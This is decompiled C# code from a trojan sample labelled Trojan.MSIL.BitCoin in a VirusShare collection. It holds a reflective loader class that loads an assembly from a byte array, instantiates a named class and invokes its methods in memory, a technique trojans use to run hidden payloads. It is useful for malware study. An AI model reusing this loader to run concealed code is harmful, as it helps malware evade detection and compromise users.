// Decompiled with JetBrains decompiler
// Type: DI
// Assembly: new22, Version=3.6.0.1403, Culture=neutral, PublicKeyToken=null
// MVID: 17D1A387-A51D-4A8D-BA74-9649CECC7EE7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan.MSIL.BitCoin.jba-8b31cb3b2e397f75f24ae5b9cfdf974fbf07fc34c400be78ea4d6ca940b4cfe6.exe

using System;
using System.Collections;
using System.Reflection;
using System.Runtime.CompilerServices;

public class DI
{
  public static Hashtable AR = new Hashtable();
  public static Hashtable CR = new Hashtable();

  public static DI.DCI GetClassReference(byte[] AssemblyName, string ClassName)
  {
    if (!DI.CR.ContainsKey((object) AssemblyName))
    {
      Assembly target = (Assembly) null;
      if (!DI.AR.ContainsKey((object) AssemblyName))
        DI.AR.Add((object) AssemblyName, (object) DI.InlineAssignHelper<Assembly>(ref target, Assembly.Load(AssemblyName)));
      else
        target = (Assembly) DI.AR[(object) AssemblyName];
      Type[] types = target.GetTypes();
      int index = 0;
      while (index < types.Length)
      {
        Type type = types[index];
        if (type.IsClass && type.FullName.EndsWith("." + ClassName))
        {
          DI.DCI classReference = new DI.DCI(type, RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type)));
          DI.CR.Add((object) AssemblyName, (object) classReference);
          return classReference;
        }
        checked { ++index; }
      }
    }
    return (DI.DCI) DI.CR[(object) AssemblyName];
  }

  public static object InvokeMethod(DI.DCI ci, string MethodName, object[] args) => RuntimeHelpers.GetObjectValue(ci.type.InvokeMember(MethodName, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(ci.ClassObject), args));

  public static object InvokeMethod(
    byte[] AssemblyName,
    string ClassName,
    string MethodName,
    object[] args)
  {
    return DI.InvokeMethod(DI.GetClassReference(AssemblyName, ClassName), MethodName, args);
  }

  private static T InlineAssignHelper<T>(ref T target, T value)
  {
    target = value;
    return value;
  }

  public class DCI
  {
    public Type type;
    public object ClassObject;

    public DCI()
    {
    }

    public DCI(Type t, object c)
    {
      this.type = t;
      this.ClassObject = RuntimeHelpers.GetObjectValue(c);
    }
  }
}
